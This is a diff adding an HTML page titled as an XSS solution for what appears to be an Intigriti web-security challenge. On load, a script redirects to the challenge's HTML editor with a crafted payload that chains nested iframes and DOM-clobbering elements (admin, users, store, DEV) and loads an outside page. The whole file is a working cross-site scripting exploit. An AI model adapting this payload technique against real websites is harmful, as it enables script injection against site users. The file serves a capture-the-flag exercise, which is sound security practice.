@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>ROOT EVAL's XSS solution</title>
+</head>
+<body>
+
+	<script type="text/javascript">
+		const url = "https://challenge-0721.intigriti.io/htmledit.php";
+		const payload = `<iframe srcdoc="<iframe srcdoc='<a id=admin href=https://admin:admin@admin.com>Hi there</a>' name='users'></iframe>" name="store"></iframe><div id=DEV></div><iframe src='./console.php'></iframe><iframe src=https://structhack.github.io></iframe>`
+		window.onload = ()=>{
+			location=`${url}?code=${payload}`
+		}
+	</script>
+
+</body>
+</html>
